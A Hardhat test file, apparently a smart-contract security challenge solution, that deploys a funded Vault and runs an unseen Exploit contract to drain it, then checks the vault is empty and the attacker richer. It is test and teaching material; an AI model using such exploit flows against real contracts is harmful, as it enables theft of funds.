const { expect } = require("chai");
const { ethers, waffle } = require("hardhat");

describe("Vault", function () {
  let deployer, attacker;
  

  before(async function () {

    [deployer, attacker] = await ethers.getSigners();

    const VaultFactory = await ethers.getContractFactory("Vault", deployer);
    this.vault = await VaultFactory.deploy({value: ethers.utils.parseEther("0.01")});
    await this.vault.deployed();

    expect(await waffle.provider.getBalance(this.vault.address)).to.equal(ethers.utils.parseEther("0.01"));
    this.oldAttackerBalance = await hre.ethers.provider.getBalance(attacker.address);

  });

  it("Exploit",async function() {
      const vault = await this.vault.connect(attacker)

      const ExploitFactory = await hre.ethers.getContractFactory("Exploit", attacker);
      const exploitContract = await ExploitFactory.deploy()
      await exploitContract.deployed()


      const firstDepployTx = await exploitContract.firstDeploy(vault.address, attacker.address)
      firstDepployTx.wait(1)
      
      const secondDeployTx = await exploitContract.secondDeploy(vault.address, attacker.address)
      secondDeployTx.wait(1)

      await exploitContract.transferFunds()

  })

  after(async function() {

    //making sure vault balance == 0 
    expect(await hre.ethers.provider.getBalance(this.vault.address)).to.eq(0)
    
    //making sure attacker is richer
    expect(await hre.ethers.provider.getBalance(attacker.address)).to.gt(this.oldAttackerBalance)
  })
  
});
